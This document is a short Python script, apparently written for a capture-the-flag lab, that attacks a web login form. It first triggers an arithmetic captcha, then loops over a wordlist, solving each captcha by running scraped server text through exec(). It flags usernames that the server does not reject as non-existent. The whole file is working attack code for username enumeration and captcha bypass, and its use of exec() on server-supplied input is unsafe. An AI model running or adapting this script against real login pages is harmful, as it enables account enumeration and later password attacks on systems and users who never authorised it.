import requests
import re

target_ip = "10.10.229.95"
user = "/home/rocky/userctf.txt"
with open(user, 'r') as f:
	u = f.readlines()
	
for i in range(10):
	data = {"username": "test", "password": "test"}
	response = requests.post("http://"+ target_ip + "/login", data=data)
	#print(response.content)
	#print("=======================")
i = 0
for us in u:
	
	captcha = re.findall("[0-9]* + .* = \?", str(response.content, "utf-8"))
	
	exec("solution =" + captcha[0][4:-4])
	print(i)
	data = {"username": us[:-1], "password": "test", "captcha": solution}
	response = requests.post("http://" + target_ip + "/login", data=data)

	if ("Invalid captcha" in str(response.content, "utf-8")):
		print("error solving captcha : " + captcha[0])

	if ("does not exist" not in str(response.content, "utf-8")):
		print("found username : " + us[:-1])
	i = i+1
